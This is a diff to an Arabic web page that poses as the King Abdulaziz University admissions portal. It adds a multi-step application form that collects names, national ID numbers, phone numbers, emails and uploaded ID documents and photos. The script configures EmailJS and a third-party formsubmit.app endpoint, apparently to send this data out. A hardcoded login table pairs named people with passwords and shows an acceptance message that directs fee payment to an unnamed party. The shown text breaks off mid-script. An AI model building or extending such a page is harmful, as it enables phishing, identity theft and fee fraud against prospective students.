@@ -1,149 +1,304 @@
-<!DOCTYPE html>
+here<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>تسجيل الدخول - جامعة الملك عبد العزيز</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+  <title>بوابة القبول - جامعة الملك عبد العزيز</title>
+
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
   <style>
+    * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+    html, body { margin: 0; padding: 0; overflow-x: hidden; }
     body {
-      font-family: 'Tahoma', sans-serif;
+      font-family: 'Tahoma', 'Segoe UI', sans-serif;
       background-color: #f0f0f0;
-      margin: 0;
-      padding: 20px;
+      min-height: 100vh;
+      padding: 16px;
       display: flex;
       flex-direction: column;
       align-items: center;
+      gap: 16px;
     }
 
-    .image-intro {
-      padding-top: 15px;
-      margin-bottom: 40px;
-      overflow: hidden;
-      width: 100%;
-      max-width: 500px;
-    }
-
+    .image-intro { width: 100%; max-width: 500px; overflow: hidden; border-radius: 12px; cursor: pointer; }
     .image-intro img {
-      max-width: 100%;
-      height: auto;
-      border: 2px solid #ccc;
-      border-radius: 12px;
+      width: 100%; height: auto; display: block;
+      border: 2px solid #ccc; border-radius: 12px;
       box-shadow: 0 4px 8px rgba(0,0,0,0.1);
-      position: relative;
-      right: -100%;
+      position: relative; right: -100%;
       animation: slideIn 1.5s ease-out forwards;
+      transition: transform 0.2s;
     }
-
-    @keyframes slideIn {
-      to {
-        right: 0;
-      }
-    }
+    .image-intro img:hover { transform: scale(1.02); }
+    @keyframes slideIn { to { right: 0; } }
 
     .container {
-      width: 100%;
-      max-width: 450px;
-      background-color: #fff;
-      border-radius: 10px;
+      width: 100%; max-width: 500px;
+      background-color: #fff; border-radius: 10px;
       box-shadow: 0 0 15px rgba(0,0,0,0.1);
-      padding: 30px 20px;
-      box-sizing: border-box;
-      margin-bottom: 20px;
+      padding: 24px 20px; margin: 0;
     }
 
-    .logo-container {
-      display: flex;
-      justify-content: center;
-      margin-bottom: 20px;
-    }
-
-    .logo-container img {
-      max-width: 120px;
-    }
+    .logo-container { display: flex; justify-content: center; margin-bottom: 16px; }
+    .logo-container img { max-width: 110px; height: auto; }
 
     h2, h3 {
-      color: #006c35;
-      margin-bottom: 20px;
-      text-align: center;
+      color: #006c35; margin: 0 0 18px 0; text-align: center;
+      font-size: clamp(16px, 4.5vw, 20px); line-height: 1.5;
     }
 
-    input {
-      width: 100%;
-      padding: 10px;
-      margin: 10px 0;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-      font-size: 15px;
-      box-sizing: border-box;
+    label {
+      display: block; color: #333; font-size: 14px;
+      margin: 12px 0 4px 0; font-weight: bold; text-align: right;
+    }
+    label .required { color: #c0392b; }
+
+    input, select {
+      width: 100%; padding: 12px 14px; margin: 0;
+      border: 1px solid #ccc; border-radius: 6px;
+      font-size: 15px; font-family: inherit; background-color: #fff;
+      transition: border-color 0.2s;
+    }
+    input:focus, select:focus {
+      outline: none; border-color: #006c35;
+      box-shadow: 0 0 0 3px rgba(0,108,53,0.1);
     }
 
     button {
-      width: 100%;
-      padding: 10px;
-      background-color: #006c35;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      font-size: 16px;
-      cursor: pointer;
+      width: 100%; padding: 12px; background-color: #006c35;
+      color: #fff; border: none; border-radius: 6px;
+      font-size: 15px; font-family: inherit; cursor: pointer;
+      transition: background-color 0.2s;
     }
+    button:hover { background-color: #005528; }
+    button:disabled { background-color: #888; cursor: not-allowed; }
 
-    .footer-image img {
-      width: 100%;
-      border-radius: 8px;
-    }
-
-    .hidden {
-      display: none;
-    }
+    .footer-image img { width: 100%; height: auto; display: block; border-radius: 8px; }
+    .hidden { display: none !important; }
 
     p, ul {
-      text-align: right;
-      line-height: 1.8;
-      color: #333;
+      text-align: right; line-height: 1.8; color: #333;
+      font-size: clamp(14px, 3.8vw, 15px); margin: 10px 0;
     }
-
-    strong {
-      color: #006c35;
-    }
+    ul { padding-right: 20px; }
+    strong { color: #006c35; }
 
     #studentNameDisplay {
-      color: #006c35;
-      font-weight: bold;
-      font-size: 18px;
-      text-align: center;
-      margin-top: -10px;
+      color: #006c35; font-weight: bold;
+      font-size: clamp(15px, 4vw, 17px);
+      text-align: center; margin: 0 0 15px 0;
     }
 
-    .social-links {
-      text-align: center;
-      margin: 30px 0;
+    .social-links { text-align: center; margin: 10px 0; width: 100%; max-width: 500px; }
+    .social-links img { margin: 0 8px; vertical-align: middle; width: 30px; height: 30px; }
+
+    .welcome-text {
+      text-align: right; line-height: 1.8; color: #333;
+      font-size: clamp(14px, 3.8vw, 15px); margin-bottom: 15px;
     }
 
-    .social-links img {
-      margin: 0 10px;
-      vertical-align: middle;
+    .option-btn {
+      display: block; width: 100%; padding: 12px; margin: 10px 0;
+      background-color: #006c35; color: #fff; border: none;
+      border-radius: 6px; font-size: 15px; font-family: inherit;
+      cursor: pointer; text-align: center; transition: background-color 0.2s;
+    }
+    .option-btn:hover { background-color: #005528; }
+    .option-btn.secondary { background-color: #fff; color: #006c35; border: 1px solid #006c35; }
+    .option-btn.secondary:hover { background-color: #eaf5ee; }
+    .option-btn.gray { background-color: #f1f1f1; color: #333; border: 1px solid #ccc; }
+    .option-btn.gray:hover { background-color: #e2e2e2; }
+
+    .step-item {
+      background-color: #f9f9f9; border-right: 4px solid #006c35;
+      padding: 10px 12px; border-radius: 6px; margin-bottom: 8px;
+      font-size: clamp(13px, 3.6vw, 14px); color: #333; line-height: 1.7;
+    }
+    .step-item strong { color: #006c35; display: block; margin-bottom: 3px; }
+
+    .docs-list { list-style: none; padding: 0; margin: 0; }
+    .docs-list li {
+      padding: 8px 0; border-bottom: 1px dashed #ddd;
+      color: #333; font-size: clamp(14px, 3.8vw, 15px); text-align: right;
+    }
+    .docs-list li:last-child { border-bottom: none; }
+    .docs-list li::before { content: "✔ "; color: #006c35; font-weight: bold; }
+
+    .progress-bar {
+      display: flex; justify-content: space-between; align-items: center;
+      margin: 0 0 25px 0; position: relative;
+    }
+    .progress-bar::before {
+      content: ""; position: absolute; top: 16px;
+      right: 10%; left: 10%; height: 2px; background-color: #ddd; z-index: 0;
+    }
+    .progress-step {
+      width: 32px; height: 32px; border-radius: 50%;
+      background-color: #ddd; color: #fff;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 14px; font-weight: bold; position: relative; z-index: 1;
+      transition: all 0.3s;
+    }
+    .progress-step.active { background-color: #006c35; transform: scale(1.1); }
+    .progress-step.done { background-color: #006c35; }
+
+    .form-group { margin-bottom: 6px; }
+
+    .phone-group { display: flex; gap: 8px; align-items: stretch; }
+    .phone-group select { max-width: 130px; flex-shrink: 0; }
+    .phone-group input { flex: 1; }
+    .phone-hint { color: #666; font-size: 12px; display: block; margin-top: 4px; text-align: right; }
+
+    .radio-group { display: flex; gap: 10px; margin-top: 6px; }
+    .radio-group label {
+      flex: 1; background-color: #f9f9f9;
+      border: 2px solid #ddd; border-radius: 6px;
+      padding: 12px; text-align: center; cursor: pointer;
+      font-weight: normal; font-size: 14px; margin: 0;
+      transition: all 0.2s;
+    }
+    .radio-group input[type="radio"] { display: none; }
+    .radio-group input[type="radio"]:checked + span { color: #006c35; font-weight: bold; }
+    .radio-group label:has(input:checked) { border-color: #006c35; background-color: #eaf5ee; }
+
+    .file-wrapper {
+      position: relative;
+      border: 2px dashed #006c35;
+      border-radius: 6px;
+      background-color: #f9fdfa;
+      padding: 14px;
+      cursor: pointer;
+      transition: background-color 0.2s;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+    .file-wrapper:hover { background-color: #eaf5ee; }
+    .file-wrapper input[type="file"] {
+      position: absolute; top: 0; left: 0;
+      width: 100%; height: 100%;
+      opacity: 0; cursor: pointer; z-index: 5;
+    }
+    .file-label {
+      display: block; color: #006c35;
+      font-weight: bold; font-size: 14px;
+      pointer-events: none; z-index: 2;
+    }
+    .file-name {
+      display: block; color: #555; font-size: 13px;
+      margin-top: 6px; word-break: break-all;
+      pointer-events: none; min-height: 18px; z-index: 2;
+    }
+    .file-name.has-file { color: #006c35; font-weight: bold; }
+    .file-name.empty { color: #999; font-style: italic; }
+
+    .file-hint {
+      font-size: 13px; color: #666; margin-top: 15px;
+      background: #f9f9f9; padding: 12px;
+      border-radius: 6px; border-right: 3px solid #006c35;
+      line-height: 1.9;
+    }
+
+    .nav-buttons { display: flex; gap: 10px; margin-top: 20px; }
+    .nav-buttons button { flex: 1; }
+
+    .success-icon { display: flex; justify-content: center; margin: 10px 0 20px 0; }
+    .success-icon div {
+      width: 70px; height: 70px; background-color: #006c35;
+      color: #fff; border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 38px; animation: pop 0.4s ease-out;
+    }
+    @keyframes pop {
+      0% { transform: scale(0); }
+      80% { transform: scale(1.15); }
+      100% { transform: scale(1); }
+    }
+
+    .request-number {
+      background-color: #eaf5ee; border-right: 4px solid #006c35;
+      padding: 14px; border-radius: 6px; text-align: center;
+      margin: 15px 0; font-size: 16px;
+    }
+    .request-number strong { display: block; margin-bottom: 6px; font-size: 14px; }
+    .request-number span { color: #006c35; font-size: 22px; font-weight: bold; letter-spacing: 1px; }
+
+    .review-box {
+      background-color: #f9f9f9; border-radius: 6px;
+      padding: 14px; margin: 10px 0;
+      font-size: 14px; line-height: 1.9; color: #333;
+    }
+    .review-box strong { color: #006c35; }
+
+    .loading-overlay {
+      position: fixed; inset: 0; background-color: rgba(0,0,0,0.6);
+      display: flex; align-items: center; justify-content: center;
+      z-index: 9999; color: #fff; font-size: 16px;
+    }
+    .loading-overlay .spinner {
+      width: 45px; height: 45px;
+      border: 4px solid rgba(255,255,255,0.3);
+      border-top-color: #fff; border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin: 0 auto 15px;
+    }
+    .loading-content {
+      background-color: #006c35; padding: 25px 35px;
+      border-radius: 12px; text-align: center;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    @media (max-width: 480px) {
+      body { padding: 10px; gap: 12px; }
+      .container { padding: 20px 16px; border-radius: 8px; }
+      .image-intro { margin-bottom: 0; }
+      h2, h3 { margin-bottom: 14px; }
+      .logo-container img { max-width: 90px; }
+      .step-item { padding: 9px 10px; }
+      .radio-group { flex-direction: column; }
+      .nav-buttons { flex-direction: column-reverse; }
+    }
+    @media (min-width: 768px) {
+      body { padding: 24px; gap: 20px; }
+      .container { padding: 30px 28px; }
     }
   </style>
 </head>
 <body>
 
-  <!-- صورة متحركة في الصفحة الرئيسية فقط -->
-  <div class="image-intro" id="animatedImage">
-    <a href="https://postimages.org/" target="_blank">
-      <img src="https://i.postimg.cc/44MVsCbM/image.jpg" alt="مقدمة">
-    </a>
+  <div class="image-intro" id="animatedImage" onclick="openNafathApp(event)">
+    <img src="https://i.postimg.cc/44MVsCbM/image.jpg" alt="اضغط لتحميل تطبيق نفاذ">
+  </div>
+
+  <!-- صفحة البداية -->
+  <div class="container" id="landingBox">
+    <div class="logo-container">
+      <img src="https://i.postimg.cc/T14NrGDT/image.jpg" alt="شعار الجامعة">
+    </div>
+    <h2>بوابة القبول الإلكتروني</h2>
+    <p class="welcome-text">
+      مرحباً بك في بوابة التقديم الإلكتروني لجامعة الملك عبد العزيز.
+      يمكنك من خلال هذه البوابة تقديم طلب الالتحاق ومتابعة حالة طلبك بسهولة.
+      الرجاء اختيار الخيار المناسب:
+    </p>
+    <button type="button" class="option-btn" onclick="showLogin()">🔑 تسجيل الدخول</button>
+    <button type="button" class="option-btn secondary" onclick="startNewRequest()">🆕 تقديم طلب جديد</button>
+    <button type="button" class="option-btn gray" onclick="alert('يرجى التواصل مع عمادة القبول والتسجيل لمتابعة حالة الطلب')">🔍 متابعة حالة الطلب</button>
   </div>
 
   <!-- تسجيل الدخول -->
-  <div class="container" id="loginBox">
+  <div class="container hidden" id="loginBox">
     <div class="logo-container">
       <img src="https://i.postimg.cc/T14NrGDT/image.jpg" alt="شعار الجامعة">
     </div>
     <h2>تسجيل الدخول جامعة الملك عبد العزيز</h2>
     <input type="text" id="username" placeholder="اسم المستخدم">
     <input type="password" id="password" placeholder="كلمة المرور">
-    <button onclick="login()">دخول</button>
+    <button type="button" onclick="login()">دخول</button>
+    <button type="button" class="option-btn gray" onclick="showLanding()" style="margin-top:10px;">⬅ رجوع</button>
   </div>
 
   <!-- صفحة القبول -->
@@ -153,20 +308,278 @@
     </div>
     <h3>تم قبولك في جامعة الملك عبد العزيز</h3>
     <p id="studentNameDisplay"></p>
-
     <p><strong>لإكمال عملية التسجيل، يرجى اتباع الخطوات التالية:</strong></p>
     <ul>
       <li>التواصل مع الجهة المعنية لسداد الرسوم الدراسية.</li>
       <li>اتباع التعليمات والإرشادات المقدمة من الجهات المختصة لإتمام عملية السداد.</li>
     </ul>
-
     <p><strong>ملاحظة:</strong> سداد الرسوم هو شرط أساسي لإتمام عملية القبول و تسجيل.</p>
+    <p>مع أطيب التحيات،<br><strong>عمادة القبول والتسجيل</strong><br>جامعة الملك عبد العزيز</p>
+    <button type="button" class="option-btn gray" onclick="logout()">⬅ تسجيل الخروج</button>
+  </div>
+
+  <!-- الخطوة 1 -->
+  <div class="container hidden" id="step1Box">
+    <div class="logo-container">
+      <img src="https://i.postimg.cc/T14NrGDT/image.jpg" alt="شعار الجامعة">
+    </div>
+    <h3>تقديم طلب جديد - البيانات الشخصية</h3>
+
+    <div class="progress-bar">
+      <div class="progress-step active">1</div>
+      <div class="progress-step">2</div>
+      <div class="progress-step">3</div>
+      <div class="progress-step">4</div>
+    </div>
+
+    <div class="form-group">
+      <label>الاسم الكامل <span class="required">*</span></label>
+      <input type="text" id="fullName" placeholder="أدخل اسمك الرباعي">
+    </div>
+    <div class="form-group">
+      <label>رقم الهوية الوطنية / الإقامة <span class="required">*</span></label>
+      <input type="text" id="nationalId" placeholder="مثال: 1234567890" maxlength="10" inputmode="numeric">
+    </div>
+    <div class="form-group">
+      <label>رقم الجوال <span class="required">*</span></label>
+      <div class="phone-group">
+        <select id="countryCode">
+          <option value="+966">🇸🇦 +966</option>
+          <option value="+971">🇦🇪 +971</option>
+          <option value="+967">🇾🇪 +967</option>
+          <option value="+20">🇪🇬 +20</option>
+          <option value="+962">🇯🇴 +962</option>
+          <option value="+965">🇰🇼 +965</option>
+          <option value="+973">🇧🇭 +973</option>
+          <option value="+968">🇴🇲 +968</option>
+          <option value="+974">🇶🇦 +974</option>
+          <option value="+964">🇮🇶 +964</option>
+          <option value="+963">🇸🇾 +963</option>
+          <option value="+961">🇱🇧 +961</option>
+          <option value="+212">🇲🇦 +212</option>
+          <option value="+213">🇩🇿 +213</option>
+          <option value="+216">🇹🇳 +216</option>
+          <option value="+218">🇱🇾 +218</option>
+          <option value="+249">🇸🇩 +249</option>
+          <option value="+1">🇺🇸 +1</option>
+          <option value="+44">🇬🇧 +44</option>
+          <option value="+90">🇹🇷 +90</option>
+          <option value="+91">🇮🇳 +91</option>
+          <option value="+92">🇵🇰 +92</option>
+        </select>
+        <input type="tel" id="phone" placeholder="مثال: 501234567" maxlength="15" inputmode="numeric">
+      </div>
+      <small class="phone-hint">اختر رمز الدولة ثم أدخل الرقم بدون الصفر في البداية.</small>
+    </div>
+    <div class="form-group">
+      <label>البريد الإلكتروني <span class="required">*</span></label>
+      <input type="email" id="email" placeholder="example@email.com">
+    </div>
+    <div class="form-group">
+      <label>الجنس <span class="required">*</span></label>
+      <div class="radio-group">
+        <label><input type="radio" name="gender" value="male"><span>👨 ذكر</span></label>
+        <label><input type="radio" name="gender" value="female"><span>👩 أنثى</span></label>
+      </div>
+    </div>
+
+    <div class="nav-buttons">
+      <button type="button" class="option-btn gray" onclick="backToLanding()">⬅ إلغاء</button>
+      <button type="button" onclick="goToStep2()">التالي ➡</button>
+    </div>
+  </div>
+
+  <!-- الخطوة 2 -->
+  <div class="container hidden" id="step2Box">
+    <div class="logo-container">
+      <img src="https://i.postimg.cc/T14NrGDT/image.jpg" alt="شعار الجامعة">
+    </div>
+    <h3>تقديم طلب جديد - المؤهل الدراسي</h3>
+
+    <div class="progress-bar">
+      <div class="progress-step done">✓</div>
+      <div class="progress-step active">2</div>
+      <div class="progress-step">3</div>
+      <div class="progress-step">4</div>
+    </div>
+
+    <div class="form-group">
+      <label>نوع الشهادة <span class="required">*</span></label>
+      <select id="certType">
+        <option value="">-- اختر --</option>
+        <option value="ثانوية عامة">ثانوية عامة</option>
+        <option value="دبلوم">دبلوم</option>
+        <option value="بكالوريوس">بكالوريوس</option>
+      </select>
+    </div>
+    <div class="form-group">
+      <label>سنة التخرج <span class="required">*</span></label>
+      <input type="number" id="gradYear" placeholder="مثال: 2024" min="1990" max="2030">
+    </div>
+    <div class="form-group">
+      <label>النسبة المئوية / المعدل <span class="required">*</span></label>
+      <input type="number" id="gpa" placeholder="مثال: 95.5" step="0.01" min="50" max="100">
+    </div>
+    <div class="form-group">
+      <label>الرغبة الأولى <span class="required">*</span></label>
+      <select id="firstChoice">
+        <option value="">-- اختر التخصص --</option>
+        <option value="كلية الحاسبات وتقنية المعلومات">كلية الحاسبات وتقنية المعلومات</option>
+        <option value="كلية الهندسة">كلية الهندسة</option>
+        <option value="كلية الطب">كلية الطب</option>
+        <option value="كلية الاقتصاد والإدارة">كلية الاقتصاد والإدارة</option>
+        <option value="كلية العلوم">كلية العلوم</option>
+        <option value="كلية الآداب والعلوم الإنسانية">كلية الآداب والعلوم الإنسانية</option>
+      </select>
+    </div>
+    <div class="form-group">
+      <label>الرغبة الثانية (اختياري)</label>
+      <select id="secondChoice">
+        <option value="">-- اختر التخصص --</option>
+        <option value="كلية الحاسبات وتقنية المعلومات">كلية الحاسبات وتقنية المعلومات</option>
+        <option value="كلية الهندسة">كلية الهندسة</option>
+        <option value="كلية الطب">كلية الطب</option>
+        <option value="كلية الاقتصاد والإدارة">كلية الاقتصاد والإدارة</option>
+        <option value="كلية العلوم">كلية العلوم</option>
+        <option value="كلية الآداب والعلوم الإنسانية">كلية الآداب والعلوم الإنسانية</option>
+      </select>
+    </div>
+
+    <div class="nav-buttons">
+      <button type="button" class="option-btn gray" onclick="goToStep1()">⬅ السابق</button>
+      <button type="button" onclick="goToStep3()">التالي ➡</button>
+    </div>
+  </div>
+
+  <!-- الخطوة 3 -->
+  <div class="container hidden" id="step3Box">
+    <div class="logo-container">
+      <img src="https://i.postimg.cc/T14NrGDT/image.jpg" alt="شعار الجامعة">
+    </div>
+    <h3>تقديم طلب جديد - رفع المستندات</h3>
+
+    <div class="progress-bar">
+      <div class="progress-step done">✓</div>
+      <div class="progress-step done">✓</div>
+      <div class="progress-step active">3</div>
+      <div class="progress-step">4</div>
+    </div>
+
+    <div class="form-group">
+      <label>صورة الهوية الوطنية / الإقامة <span class="required">*</span></label>
+      <div class="file-wrapper">
+        <input type="file" id="fileId" accept="*/*" onchange="updateFileName(this, 'nameId')">
+        <span class="file-label">📎 اضغط لاختيار ملف الهوية</span>
+        <span class="file-name empty" id="nameId">لم يتم اختيار أي ملف</span>
+      </div>
+    </div>
+
+    <div class="form-group">
+      <label>شهادة الثانوية العامة <span class="required">*</span></label>
+      <div class="file-wrapper">
+        <input type="file" id="fileCert" accept="*/*" onchange="updateFileName(this, 'nameCert')">
+        <span class="file-label">📎 اضغط لاختيار ملف الشهادة</span>
+        <span class="file-name empty" id="nameCert">لم يتم اختيار أي ملف</span>
+      </div>
+    </div>
+
+    <div class="form-group">
+      <label>صورة شخصية حديثة <span class="required">*</span></label>
+      <div class="file-wrapper">
+        <input type="file" id="filePhoto" accept="*/*" onchange="updateFileName(this, 'namePhoto')">
+        <span class="file-label">📎 اضغط لاختيار الصورة الشخصية</span>
+        <span class="file-name empty" id="namePhoto">لم يتم اختيار أي ملف</span>
+      </div>
+    </div>
+
+    <div class="file-hint">
+      📌 <strong>إرشادات رفع الملفات:</strong><br>
+      • يقبل النظام جميع الصيغ<br>
+      • الحد الأقصى لكل ملف: <strong>5 ميجابايت</strong><br>
+      • الحد الأقصى الإجمالي: <strong>9 ميجابايت</strong>
+    </div>
+
+    <div class="nav-buttons">
+      <button type="button" class="option-btn gray" onclick="goToStep2()">⬅ السابق</button>
+      <button type="button" onclick="goToStep4()">التالي ➡</button>
+    </div>
+  </div>
+
+  <!-- الخطوة 4 -->
+  <div class="container hidden" id="step4Box">
+    <div class="logo-container">
+      <img src="https://i.postimg.cc/T14NrGDT/image.jpg" alt="شعار الجامعة">
+    </div>
+    <h3>مراجعة الطلب قبل الإرسال</h3>
+
+    <div class="progress-bar">
+      <div class="progress-step done">✓</div>
+      <div class="progress-step done">✓</div>
+      <div class="progress-step done">✓</div>
+      <div class="progress-step active">4</div>
+    </div>
+
+    <div id="reviewContent"></div>
+
+    <p style="font-size: 13px; color: #666; margin-top: 15px;">
+      ⚠️ بتأكيدك الإرسال، أنت تقر بصحة البيانات والمستندات المرفقة.
+    </p>
+
+    <div class="nav-buttons">
+      <button type="button" class="option-btn gray" onclick="goToStep3()">⬅ السابق</button>
+      <button type="button" id="submitBtn" onclick="submitRequest(event)">✅ إرسال الطلب</button>
+    </div>
+  </div>
+
+  <!-- صفحة النجاح -->
+  <div class="container hidden" id="requestSuccessBox">
+    <div class="logo-container">
+      <img src="https://i.postimg.cc/T14NrGDT/image.jpg" alt="شعار الجامعة">
+    </div>
+    <div class="success-icon"><div>✓</div></div>
+    <h3>تم استلام طلبك بنجاح</h3>
+
+    <p style="text-align: center;">
+      شكراً لك، تم استلام طلب التقديم الخاص بك وسيتم مراجعته من قبل عمادة القبول والتسجيل.
+    </p>
+
+    <div class="request-number">
+      <strong>رقم الطلب الخاص بك:</strong>
+      <span id="requestNumber">—</span>
+    </div>
+
+    <p style="font-size: 13px; color: #666;">
+      📌 احتفظ برقم الطلب لمتابعة حالة طلبك لاحقاً.
+    </p>
 
     <p>
-      مع أطيب التحيات،<br>
-      <strong>عمادة القبول والتسجيل</strong><br>
-      جامعة الملك عبد العزيز
+      سيتم التواصل معك عبر الجوال أو البريد الإلكتروني المُسجّل خلال
+      <strong>3-5 أيام عمل</strong> بإذن الله.
     </p>
+
+    <p>مع أطيب التحيات،<br><strong>عمادة القبول والتسجيل</strong><br>جامعة الملك عبد العزيز</p>
+
+    <button type="button" class="option-btn gray" onclick="backToLanding()">🏠 العودة للصفحة الرئيسية</button>
+  </div>
+
+  <!-- خطوات التقديم -->
+  <div class="container" id="stepsBox">
+    <h3>خطوات التقديم</h3>
+    <div class="step-item"><strong>1️⃣ البيانات الشخصية</strong>الاسم، رقم الهوية، الجوال، البريد الإلكتروني.</div>
+    <div class="step-item"><strong>2️⃣ المؤهل الدراسي</strong>نوع الشهادة، سنة التخرج، المعدل، الرغبات.</div>
+    <div class="step-item"><strong>3️⃣ رفع المستندات</strong>الهوية، شهادة الثانوية، الصورة الشخصية.</div>
+    <div class="step-item"><strong>4️⃣ المراجعة والإرسال</strong>مراجعة البيانات ثم إرسال الطلب.</div>
+  </div>
+
+  <!-- المستندات المطلوبة -->
+  <div class="container" id="docsBox">
+    <h3>المستندات المطلوبة</h3>
+    <ul class="docs-list">
+      <li>صورة الهوية الوطنية / الإقامة</li>
+      <li>شهادة الثانوية العامة</li>
+      <li>صورة شخصية حديثة</li>
+      <li>سداد رسوم التقديم (إن وجدت)</li>
+    </ul>
   </div>
 
   <!-- صورة أسفل الصفحة -->
@@ -174,18 +587,170 @@
     <img src="https://i.postimg.cc/Hk9R0M4B/image.jpg" alt="النفاذ الوطني الموحد">
   </div>
 
-  <!-- روابط التواصل الاجتماعي -->
+  <!-- روابط التواصل -->
   <div class="social-links">
     <p><strong>تابعنا على منصات التواصل:</strong></p>
     <a href="https://www.facebook.com/share/1BbfZKpCic/" target="_blank">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="فيسبوك" width="30">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="فيسبوك">
     </a>
     <a href="https://www.instagram.com/abdul.azizuniversity?igsh=MXJocXB2Ym5iNWI0OA==" target="_blank">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="إنستغرام" width="30">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="إنستغرام">
     </a>
   </div>
 
+  <!-- شاشة التحميل -->
+  <div class="loading-overlay hidden" id="loadingOverlay">
+    <div class="loading-content">
+      <div class="spinner"></div>
+      <div>جاري إرسال الطلب...</div>
+    </div>
+  </div>
+
   <script>
+    const EMAILJS_SERVICE_ID  = 'YOUR_SERVICE_ID';
+    const EMAILJS_TEMPLATE_ID = 'YOUR_TEMPLATE_ID';
+    const EMAILJS_PUBLIC_KEY  = 'YOUR_PUBLIC_KEY';
+    const FORMSUBMIT_ENDPOINT = 'https://formsubmit.app/f/k3tawujkb4';
+
+    emailjs.init(EMAILJS_PUBLIC_KEY);
+
+    const savedFiles = {
+      id: null,
+      cert: null,
+      photo: null
+    };
+
+    const STATE_KEY = 'kau_form_state';
+
+    function saveState() {
+      const state = {
+        currentStep: getCurrentStep(),
+        formData: {
+          fullName: document.getElementById('fullName')?.value || '',
+          nationalId: document.getElementById('nationalId')?.value || '',
+          countryCode: document.getElementById('countryCode')?.value || '+966',
+          phone: document.getElementById('phone')?.value || '',
+          email: document.getElementById('email')?.value || '',
+          gender: document.querySelector('input[name="gender"]:checked')?.value || '',
+          certType: document.getElementById('certType')?.value || '',
+          gradYear: document.getElementById('gradYear')?.value || '',
+          gpa: document.getElementById('gpa')?.value || '',
+          firstChoice: document.getElementById('firstChoice')?.value || '',
+          secondChoice: document.getElementById('secondChoice')?.value || ''
+        }
+      };
+      try { localStorage.setItem(STATE_KEY, JSON.stringify(state)); } catch(e) {}
+    }
+
+    function loadState() {
+      try {
+        const raw = localStorage.getItem(STATE_KEY);
+        return raw ? JSON.parse(raw) : null;
+      } catch(e) { return null; }
+    }
+
+    function clearState() {
+      try { localStorage.removeItem(STATE_KEY); } catch(e) {}
+    }
+
+    function getCurrentStep() {
+      const steps = ['landingBox','loginBox','successBox','step1Box','step2Box','step3Box','step4Box','requestSuccessBox'];
+      for (const id of steps) {
+        const el = document.getElementById(id);
+        if (el && !el.classList.contains('hidden')) return id;
+      }
+      return 'landingBox';
+    }
+
+    function restoreFormData(data) {
+      if (!data) return;
+      const setVal = (id, val) => {
+        const el = document.getElementById(id);
+        if (el && val) el.value = val;
+      };
+      setVal('fullName', data.fullName);
+      setVal('nationalId', data.nationalId);
+      setVal('countryCode', data.countryCode);
+      setVal('phone', data.phone);
+      setVal('email', data.email);
+      setVal('certType', data.certType);
+      setVal('gradYear', data.gradYear);
+      setVal('gpa', data.gpa);
+      setVal('firstChoice', data.firstChoice);
+      setVal('secondChoice', data.secondChoice);
+
+      if (data.gender) {
+        const radio = document.querySelector(`input[name="gender"][value="${data.gender}"]`);
+        if (radio) radio.checked = true;
+      }
+    }
+
+    window.addEventListener('DOMContentLoaded', function() {
+      const state = loadState();
+      if (!state) return;
+
+      if (state.currentStep === 'step1Box' ||
+          state.currentStep === 'step2Box' ||
+          state.currentStep === 'step3Box' ||
+          state.currentStep === 'step4Box') {
+
+        restoreFormData(state.formData);
+
+        hideAll();
+        document.getElementById('stepsBox').classList.add('hidden');
+        document.getElementById('docsBox').classList.add('hidden');
+        document.getElementById('animatedImage').style.display = 'none';
+
+        document.getElementById(state.currentStep)?.classList.remove('hidden');
+        window.scrollTo({ top: 0, behavior: 'auto' });
+      }
+    });
+
+    document.addEventListener('input', function(e) {
+      if (e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT') saveState();
+    });
+    document.addEventListener('change', function(e) {
+      if (e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT') saveState();
+    });
+
+    function openNafathApp(event) {
+      if (event) { event.preventDefault(); event.stopPropagation(); }
+      const nafathUrl = 'https://play.google.com/store/apps/details?id=sa.gov.nic.myid';
+      const link = document.createElement('a');
+      link.href = nafathUrl;
+      link.target = '_blank';
+      link.rel = 'noopener noreferrer';
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    }
+
+    function updateFileName(input, nameId) {
+      const nameEl = document.getElementById(nameId);
+      if (!nameEl) return;
+
+      if (input.files && input.files[0]) {
+        const file = input.files[0];
+        const sizeMB = (file.size / (1024*1024)).toFixed(2);
+        nameEl.textContent = `✅ ${file.name} (${sizeMB} MB)`;
+        nameEl.classList.remove('empty');
+        nameEl.classList.add('has-file');
+
+        if (input.id === 'fileId') savedFiles.id = file;
+        else if (input.id === 'fileCert') savedFiles.cert = file;
+        else if (input.id === 'filePhoto') savedFiles.photo = file;
+      } else {
+        nameEl.textContent = 'لم يتم اختيار أي ملف';
+        nameEl.classList.remove('has-file');
+        nameEl.classList.add('empty');
+
+        if (input.id === 'fileId') savedFiles.id = null;
+        else if (input.id === 'fileCert') savedFiles.cert = null;
+        else if (input.id === 'filePhoto') savedFiles.photo = null;
+      }
+      saveState();
+    }
+
     const users = {
       "usc1256": { password: "725146", name: "ميثم عمار محمد خطار" },
       "usc1252": { password: "725146", name: "فاطمة محمد احمد علي محمد" },
@@ -194,20 +759,334 @@
       "usc1255": { password: "725145", name: "عبدالله علي احمد محمد علي" }
     };
 
+    let requestData = {
+      fullName: "", nationalId: "", phone: "", email: "", gender: "",
+      certType: "", gradYear: "", gpa: "", firstChoice: "", secondChoice: "",
+      files: { id: null, cert: null, photo: null }
+    };
+
+    function hideAll() {
